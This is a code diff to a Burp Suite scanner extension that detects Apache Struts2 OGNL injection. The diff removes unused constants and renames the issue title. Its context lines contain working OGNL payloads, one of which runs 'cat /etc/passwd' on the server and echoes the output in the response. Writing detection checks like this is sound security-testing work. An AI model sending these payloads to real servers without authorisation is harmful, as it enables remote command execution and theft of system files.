@@ -3,18 +3,13 @@ from burp import IScannerCheck
 from burp import IScanIssue
 from array import array
 
-GREP_STRING = "1787569" # 1337*1337=1787569
-GREP_STRING_BYTES = bytearray(GREP_STRING)
-INJ_TEST = bytearray("%{1337*1337}")
-INJ_ERROR = "1787569"
-INJ_ERROR_BYTES = bytearray(INJ_ERROR)
-
 payload0 = '''%{1337*1337}'''
 payload1 = '''%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
 '''
 payload2 = '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 '''
 payloads = [(payload0,'1787569' ),(payload1,'tomcat'),(payload2,'root:x:')]
+
 
 class BurpExtender(IBurpExtender, IScannerCheck):
 
@@ -82,7 +77,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
                 baseRequestResponse.getHttpService(),
                 self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                 [self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, matches)],
-                "Apache struts2 OGNL Injection",
+                "Apache struts2 OGNL Injection (Reflected)",
                 "Reflect expression: " + plout,
                 "High")
 
